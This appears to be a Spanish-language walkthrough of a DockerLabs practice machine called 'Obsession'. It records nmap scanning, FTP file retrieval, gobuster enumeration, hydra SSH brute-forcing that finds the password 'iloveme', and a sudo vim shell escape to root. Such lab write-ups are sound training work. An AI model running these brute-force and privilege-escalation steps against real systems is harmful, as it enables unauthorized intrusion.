```bash

unzip obsession.zip
sudo bash auto_deploy.sh obsession.tar
kitty @ set-tab-title "Obsession"

```

Fase de reconocimiento:

nmap -sn ip
ping -c 1 ip
ping -c 1 ip -R
![[Pasted image 20260323161513.png]]

```bash
nmap -p- --open --min-rate 5000 -A -sS -Pn -n -vvv 172.17.0.2
a= sV, sC, o, traceroute
```

![[Pasted image 20260323161801.png]]

Se observan tres puetros abiertos, 21, 22 y el 80. 

En el ftp se observan dos archivos .txt
```bash
curl ftp://172.17.0.2/chat-gonza.txt
curl ftp://172.17.0.2/pendientes.txt
```
en chat-gonza observamos una convsersacion, donde podemos deducir varios nombres
![[Pasted image 20260323162148.png]]
se apuntan en una lista


Entramos en la web via IP y navegamos por la web probando, web de Russoki y se observa un correo : russoski@dockerlabs.es, en un enlace se observa otro  nombre, Juan Carlos, se apunta a la lista creada por nosotros llamada users

Vamos a por el puerto 22 de ssh
```bash
hydra -L users -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

Lo dejamos trabajando pero tarda mucho de mientras nos centramos en el puerto 80 con 

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
```
![[Pasted image 20260323163858.png]]

encontramos varias extensiones., una llamada backup y otra llamada important

En backup entramos un usuario llamado: russoski. "Usuario para todos mis servicios: russoski (cambiar pronto!)"

En important un archivo .md, con una especie de poema o noticia

realizamos hydra solo a este usuario
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

Encontramos contraseña iloveme

Conexion via ssh:
ssh russoski@172.17.0.2
iloveme
whoami
id
sudo -l
(root) NOPASSWD : /usr/bin/vim

sudo -uroot /usr/bin/vim
:!/bin/bash

whoamii

y ya somos root